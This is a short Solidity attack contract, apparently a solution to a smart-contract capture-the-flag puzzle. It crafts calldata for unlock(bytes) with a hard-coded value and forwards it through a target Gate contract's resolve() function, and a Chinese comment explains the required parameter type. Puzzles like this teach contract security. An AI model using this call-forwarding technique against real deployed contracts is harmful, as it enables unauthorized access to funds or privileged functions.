// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./greeterGate.sol";
import "hardhat/console.sol";

contract GateAttack {
    event CallData(bytes unlockData);

    //注意：这个类型不能为bytes32，必须要和函数签名中定义的一直，否则call调用时无法进入该函数！！！
    bytes public data1 =
        bytes(
            hex"00000000000000000000000000000000000000000000000000000000075bcd15"
        );
    Gate public gate;
    bytes public _unlockData = abi.encodeWithSignature("unlock(bytes)", data1);

    function callResolve(address _gate) public returns (bytes memory) {
        console.log("GateAttack---->callResolve---->1");
        bytes memory unlockData = abi.encodeWithSignature(
            "unlock(bytes)",
            data1
        );
        gate = Gate(_gate);
        console.log("GateAttack---->callResolve---->2");
        emit CallData(unlockData);
        gate.resolve(unlockData);
        console.log("GateAttack---->callResolve---->3");
        return unlockData;
    }
}
